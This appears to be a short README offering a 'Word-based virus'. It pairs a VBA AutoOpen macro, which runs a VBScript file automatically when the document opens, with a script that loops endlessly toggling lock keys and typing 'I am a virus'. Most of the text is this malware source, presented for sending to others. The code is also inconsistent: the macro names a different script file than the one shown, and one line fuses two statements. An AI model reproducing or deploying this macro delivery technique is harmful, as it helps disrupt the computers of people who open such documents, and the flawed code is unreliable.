# Word-based-virus

Sending executables usually isn't the best option. 
But we can use VBA script Macro in a Word document in order to send a virus. 
You use these files at your own risk.

Detailed steps of how I made it and explanation of codes can be seen at:
https://www.youtube.com/watch?v=UCyQlx5fzGI

In word macro:
-------------------------------

Sub AutoOpen()

Dim wb As String
Dim myPath As String
Dim myWb As String

wb = "number.vbs"
myPath = ActiveDocument.path
myWb = """" & myPath & "\" & wb & """"

' MsgBox myWb, 48

CreateObject("Wscript.Shell").Run myWb, 1, True


End Sub

-------------------------------

In EnableContent.vbs:
-------------------------------

set x=wscript.createobject ("wscript.shell") 
do 
wscript.sleep 100 x.sendkeys "{CAPSLOCK}" 
x.sendkeys "{NUMLOCK}" 
x.sendkeys "I am a virus " 
x.sendkeys "{SCROLLLOCK}" 
loop

-------------------------------
